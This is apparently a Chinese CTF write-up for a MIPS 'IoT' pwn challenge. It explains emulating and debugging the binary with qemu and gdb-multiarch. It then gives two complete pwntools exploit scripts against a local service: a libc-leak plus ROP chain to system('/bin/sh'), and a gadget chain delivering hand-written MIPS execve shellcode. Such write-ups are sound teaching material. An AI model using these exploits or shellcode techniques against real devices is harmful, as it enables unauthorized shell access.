### 夜行

本题目是一道简单的iot,**但是不是真正的iot**。区别在于真正的iot**很少可以**直接system("/bin/sh")来getshell。但是为了各位入门iot，这是一道非常好的题目。难点主要在于如何使用qemu运行程序，如何对其调试，如何学习一个新的架构的汇编和寄存器，如何构造一个不同架构的gadget。

参考之前arm架构的题目：https://www.cnblogs.com/9man/p/17834398.html

首先第一、二个问题。

```Bash
 # 不调试的如下。
  qemu-mipsel-static -L ./{这里写模拟的root文件夹} ./sec-shell
 # 调试的如下。
 qemu-mipsel-static -g 1234 -L ./{这里写模拟的root文件夹} ./sec-shell
```

调试的方法是，使用gdb-multiarch执行`target remote:1234`即可。

第三个问题，掌握好了x86的汇编之后，一通百通，万变不离其宗都是指令寄存器和几个参数寄存器，以及栈寄存器等等。网上一搜索了解了就好。第四个问题的解决在第三个的基础上。

可以使用`lw $t9, ($sp) ; lw $a0, 4($sp) ; jalr $t9`这个gadget。其中jalr t9就是跳转到t9寄存器，而他的值来自sp。然后a0是第一个参数的寄存器，相当于x86的rdi。这样就可以构造system("/bin/sh")了。这个exp是jt的。

漏洞点和日行是一样的了。这里还要注意输入ps可以直接返回libc地址。

```Python
#!/bin/python3

from pwn import *

context.log_level = 'debug'
context.os = 'linux'
#context.arch = 'amd64'
context.timeout = 3

libc = ELF("./libc.so.6")

context.arch = 'mips'
context.bits = 32
c = remote("localhost", 46581)

#c = gdb.debug("./sec-shell", "b*0x401360\nset follow-fork-mode parent\nc")
c.sendlineafter(b'$', b'ps')

c.recvuntil(b'base:0x')
puts = int(c.recv(8),16)
libcbase = puts - libc.sym['puts']
success(f"libcbase = {hex(libcbase)}")

system = libcbase + libc.sym['system']
binsh = libcbase + next(libc.search(b'/bin/sh'))
success(f"binsh = {hex(binsh)}")
rop = libcbase + 0x000fb770
#lw $t9, ($sp) ; lw $a0, 4($sp) ; jalr $t9

c.sendlineafter(b'$', b'login')

for i in range(5):
    c.sendlineafter(b'd:', cyclic(210) + p32(rop) + p32(system) + p32(binsh))

c.interactive()
```

前面提到，如果是真实的iot场景，是不能直接用system("/bin/sh")获得shell的，下面给出一个ret2shellcode版本的示例，虽然最后执行的也是execve("/bin/sh",0,0)。有兴趣的可以来挑战一下。这里还要注意特殊字符过滤。

```Python
from evilblade import *

set("./docker/iot-shell")
libset("./docker/sysroot/lib/libc.so.6")
rsetup("127.0.0.1", 70)
if args.G:
    up(["qemu-mipsel-static","-g","1234","-L","./docker/sysroot/","./docker/iot-shell"])
    # pause()
else:
    up(["qemu-mipsel-static","-L","./docker/sysroot/","./iot-shell"])

# context(os='linux', arch='mips', log_level='debug')
#
# mips shellcode pwn
# gadget("s1",-1,0,1)
# pause()

get_libc=b"ps"
sym("login")
sl(get_libc)
ru("base:")
base = getbase(getx(0,-1),"puts")

# reg_gadget = gadget("lw \$s6, 0x\w\w(\$sp)",553,base,1)+4
reg_gadget = base + 0x0007a24c + 4
#\w是匹配数字,控制s7来进行ret2shellcode
#+4后略过sw指令
#0x0007a24c #553 sw $v0, 0x18($s1) ; lw $ra, 0x34($sp) ; lw $s6, 0x30($sp) ; lw $s5, 0x2c($sp) ; 
#lw $s4, 0x28($sp) ; lw $s3, 0x24($sp) ; lw $s2, 0x20($sp) ; lw $s1, 0x1c($sp) ; lw $s0, 0x18($sp) ; jr $ra ; addiu $sp, $sp, 0x38

# sp_to_s5 = gadget(": addiu \$s5, \$sp",11,base,1)
sp_to_s5 = base + 0x0013dfa8
#0x0013dfa8 #11 addiu $s5, $sp, 0x18 ; move $a1, $s5 ; move $t9, $s6 ; jalr $t9 ; move $a0, $s2

# s5_to_pc = gadget(": move \$t9, \$s5",110,base,1)
s5_to_pc = base + 0x0009edc8
#劫持pc到栈
#0x0009edc8 #110 move $t9, $s5 ; sw $s6, 0x128($sp) ; jalr $t9 ; addu $fp, $fp, $v0

regs =  p32(0xdeadbeef)#s0
regs +=  p32(0xdeadbeef)#s1
regs +=  p32(0xdeadbeef)#s2
regs +=  p32(0xdeadbeef)#s3
regs +=  b"/bin/sh;" #s4 s5
regs += p32(s5_to_pc)#s6
regs += p32(sp_to_s5) #ra

assembly = """
    lui $t6,0x6e69
    ori $t6, $t6, 0x622f
    sw $t6, -8($sp)
    addiu $a0, $sp, -8
    lui $t6,0x1169
    ori $t6, $t6, 0x7430
    lui $t7,0x1101
    ori $t7, $t7, 0x071f
    xor $t6, $t6, $t7
    sw $t6, -4($sp)
    lw $a1, 290($sp)
    lw $a2, 290($sp)
    ori $v0, $zero, 0xfab
    syscall 0xf0f0f
"""

shellcode = asm(assembly, arch='mips', os='linux')
if b"\x20" in shellcode or b"\x00" in shellcode or b"\t" in shellcode or b"\r" in shellcode:
    print("no!!!")
    d(shellcode)
    raise EOFError

d(shellcode)
sl(b"login")
sl(cyclic(0x2))
sl(cyclic(0x2))
sl(cyclic(0x2))
sl(cyclic(0x2))

payload = cyclic(210) + p32(reg_gadget) 
payload += cyclic(24) + regs 
payload += cyclic(24) + shellcode 
d(payload)
sl(payload)

ia()
```

![img](https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=N2IxN2JmOGQxM2IwZTU2NmE4MWFhMjBkOGRlMmM3OWFfQUhDaXExSkZ5VThGQ1hXSmNCOWlrUzRsOWppU1hTcVRfVG9rZW46SWtCUmIwbDQ0bzVVNGt4NjFQY2NJQ1NTbmxkXzE3NDI0NTkyODA6MTc0MjQ2Mjg4MF9WNA)